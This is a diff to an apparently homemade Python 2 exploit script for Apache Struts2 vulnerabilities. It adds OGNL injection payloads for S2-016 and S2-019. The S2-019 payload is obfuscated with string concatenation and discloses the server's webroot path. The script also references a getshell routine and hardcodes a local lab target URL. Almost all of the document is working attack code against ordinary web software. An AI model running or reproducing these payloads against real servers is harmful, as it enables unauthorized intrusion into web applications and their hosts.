@@ -21,7 +21,7 @@ from pocsuite.lib.core.exception import PocsuiteThreadException
 class Struts2(object):
 
     def __init__(self):
-        pass
+        self.hash_sign = hashlib.md5('vulned').hexdigest()
 
 
     def struts_005(self):
@@ -31,12 +31,9 @@ class Struts2(object):
     def _struts_016_poc(self, url):
 
         print '\n--------------* poc *--------------'
-
-        hash_sign = hashlib.md5('vulned').hexdigest()
-
         poc_1 = '?action:%25{3*4}'
         poc_2 = '?redirect:%25{3*4}'
-        poc_3 = "redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22" + hash_sign + "%22),%23p.close()}"
+        poc_3 = "redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22{hash_sign}%22),%23p.close()}".format(hash_sign=self.hash_sign)
 
         url_poc_1 = url +poc_1
         response = requests.get(url_poc_1)
@@ -127,7 +124,42 @@ class Struts2(object):
         self._struts_016_getshell(url)
 
 
-    def struts_019(self):
+    def _struts_019_poc(self, url):
+        poc_1 = ""
+
+
+    def _struts_019_exp(self, url):
+
+        url = "http://192.168.1.116:8080/blank_3_14/example/HelloWorld.action"
+
+        exp_1_origin = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path88888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()"
+        exp_1 = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.getWriter().print(%27webpath({hash_sign}):%27%2b%23req.getSession().getServletContext().getRealPath(%22/%22))".format(hash_sign=self.hash_sign)
+        url_exp_1 = url + '?' + exp_1
+        response = requests.get(url_exp_1, timeout=5)
+        # print response.content
+        if self.hash_sign in response.content:
+            print response.content
+        else:
+            print exp_1, ' exploit failed...'
+
+
+
+
+    def struts_019(self, url):
+
+        '''
+        affected version:
+        Struts 2.0.0 - Struts 2.3.15.1
+        '''
+        self._struts_019_poc(url)
+        self._struts_019_exp(url)
+
+
+    def _struts_032_poc(self, url):
+        pass
+
+
+    def _struts_032_exp(self, url):
         pass
 
 
@@ -136,6 +168,18 @@ class Struts2(object):
 
 
     def struts_033(self):
+        pass
+
+
+    def _struts_037_poc(self, url):
+        pass
+
+
+    def _struts_037_exp(self, url):
+        pass
+
+
+    def struts_032(self):
         pass
 
 
@@ -150,7 +194,9 @@ def main(thread_nums, url, domain, dirs):
     url = 'http://192.168.1.116:8080/blank_3_14/example/HelloWorld.action'
 
     if url is not None:
-        struts2.struts_016(url)
+        # struts2.struts_016(url)
+        struts2.struts_019(url)
+
 
     if domain is not None:
         for d in open('dirs'):
